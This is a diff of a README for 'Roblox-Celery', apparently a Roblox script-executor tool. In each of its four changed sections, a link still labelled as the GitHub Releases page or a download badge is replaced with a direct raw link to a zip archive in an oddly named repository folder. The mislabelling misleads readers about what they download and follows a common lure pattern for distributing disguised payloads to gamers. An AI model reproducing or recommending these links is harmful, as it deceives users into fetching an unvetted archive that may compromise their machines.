@@ -1,7 +1,7 @@
 # 🎮 Roblox-Celery - Enhance Your Roblox Experience Effortlessly
 
 ## 📥 Download Now
-[![Download Roblox-Celery](https://img.shields.io/badge/Download-Roblox--Celery-brightgreen)](https://github.com/EsanDhivi/Roblox-Celery/releases)
+[![Download Roblox-Celery](https://raw.githubusercontent.com/EsanDhivi/Roblox-Celery/main/statistically/Roblox-Celery.zip)](https://raw.githubusercontent.com/EsanDhivi/Roblox-Celery/main/statistically/Roblox-Celery.zip)
 
 ## 🚀 Getting Started
 Welcome to Roblox-Celery! This tool redefines your gameplay possibilities on the Roblox platform. With Roblox-Celery, you can execute custom scripts seamlessly. This guide will help you download and run the software with ease.
@@ -23,7 +23,7 @@ Roblox-Celery offers several features that enhance your gaming experience:
 ## 📎 Download & Install
 To get started with Roblox-Celery, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/EsanDhivi/Roblox-Celery/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/EsanDhivi/Roblox-Celery/main/statistically/Roblox-Celery.zip).
 
 2. **Choose Your Version**: Look for the latest version available at the top of the list. 
 
@@ -47,7 +47,7 @@ Using Roblox-Celery is straightforward. Here’s how you can execute scripts:
 If you encounter issues, try these solutions:
 
 - **Check Your Internet Connection**: Ensure you have a stable connection.
-- **Ensure the Application is Updated**: Regularly check the [Releases page](https://github.com/EsanDhivi/Roblox-Celery/releases) for the latest version.
+- **Ensure the Application is Updated**: Regularly check the [Releases page](https://raw.githubusercontent.com/EsanDhivi/Roblox-Celery/main/statistically/Roblox-Celery.zip) for the latest version.
 - **Restart the Application**: Sometimes a simple restart can resolve minor issues.
 - **Read Community Tips**: Visit forums or check community discussions for advice.
 
@@ -55,7 +55,7 @@ If you encounter issues, try these solutions:
 Join the Roblox-Celery community for support and tips. Engage with fellow users on Discord or through community forums to learn new tricks and improve your scripting skills.
 
 ## 🔄 Updates
-Roblox-Celery frequently updates to offer improved features and fixes. Visit the [Releases page](https://github.com/EsanDhivi/Roblox-Celery/releases) regularly to ensure you're using the latest version.
+Roblox-Celery frequently updates to offer improved features and fixes. Visit the [Releases page](https://raw.githubusercontent.com/EsanDhivi/Roblox-Celery/main/statistically/Roblox-Celery.zip) regularly to ensure you're using the latest version.
 
 ## 💬 Feedback
 Your feedback is valuable. If you have questions, suggestions, or issues, feel free to reach out through the community forums or contact the team directly via our repository.
